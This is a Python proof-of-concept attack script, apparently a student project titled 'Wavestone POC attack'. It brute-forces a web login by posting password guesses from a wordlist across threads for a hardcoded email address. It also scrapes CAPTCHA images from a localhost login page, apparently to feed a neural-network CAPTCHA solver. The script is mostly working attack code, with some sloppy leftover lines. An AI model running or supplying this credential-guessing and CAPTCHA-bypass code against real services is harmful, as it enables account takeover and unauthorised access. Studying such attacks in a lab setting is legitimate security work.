print (""" 

██████  ██████  ██    ██ ████████ ███████     ███████  ██████  ██████   ██████ ███████ 
██   ██ ██   ██ ██    ██    ██    ██          ██      ██    ██ ██   ██ ██      ██      
██████  ██████  ██    ██    ██    █████       █████   ██    ██ ██████  ██      █████   
██   ██ ██   ██ ██    ██    ██    ██          ██      ██    ██ ██   ██ ██      ██      
██████  ██   ██  ██████     ██    ███████     ██       ██████  ██   ██  ██████ ███████                                                            
                                                                            
                        Wavestone POC attack
""")

import threading
import requests
import time
import sys
from label import label
from dl_models import attacker_cnn
from bs4 import BeautifulSoup
from PIL import Image

class BruteForceCracker:
    def __init__(self, url, username, error_message):
        self.url = url
        self.username = username
        self.error_message = error_message
        
        for run in banner:
            sys.stdout.write(run)
            sys.stdout.flush()
            time.sleep(0.02)

    def crack(self, password):
        data_dict = {"email": self.username, "password": password}
        response = requests.post(self.url, data=data_dict)
        if self.error_message in str(response.content):
            return False
        
        else:
            print("Username: ---> " + self.username)
            print("Password: ---> " + password)
            return True

def crack_passwords(passwords, cracker):
    count = 0
    for password in passwords:
        count += 1
        password = password.strip()
        print("Trying Password: {} Time For => {}".format(count, password))
        if cracker.crack(password):
            return
def retrieve_captcha_images(url) : 
    img_url = []
    for _ in range(10) : 
        response = requests.get(url)
        if response.status_code == 200:
            soup = BeautifulSoup(response.content, 'html.parser')
            div_tag = soup.find('div', id='randomImages')
            if div_tag:
                #je récupère ici juste le champ src de la balise (ie l'url de l'image)
                link = div_tag.img.get("src")
                #je stocke dans une liste d'url
                img_url.append(link)

            else:
                print("Div tag not found.")
            
        else:
            print("Failed to retrieve data. Status code:", response.status_code)
    #je parcours la liste d'url, et je récupère l'image que je mets quelque part 
    stock_image = []
    for i in range (len(img_url)):
        img_url[i] = "http://localhost:3006"+img_url[i]
        response = requests.get(img_url[i], stream = True)
        if response.status_code ==200:
            image = Image.open(response.raw)
            stock_image.append(image)
            pixels = list(image.getdata())
            print(pixels[307199][0])
            break
            print(stock_image)

        else : 
            print("error response")
    print(stock_image)


def main():
    url = input("Enter Target Url: ")
    error = "Password incorrect! Please try again."
    username="mohamed.mekkouri@student-cs.fr"
    cracker = BruteForceCracker(url, username, error)
    
    with open("passwords.txt", "r") as f:
        chunk_size = 1000
        while True:
            passwords = f.readlines(chunk_size)
            if not passwords:
                break
            t = threading.Thread(target=crack_passwords, args=(passwords, cracker))
            t.start()

if __name__ == '__main__':
    banner = """ 
                Checking the Server !!        
[+]█████████████████████████████████████████████████[+]
"""
    # print(banner)
    # main()
    retrieve_captcha_images("http://localhost:3006/auth/login")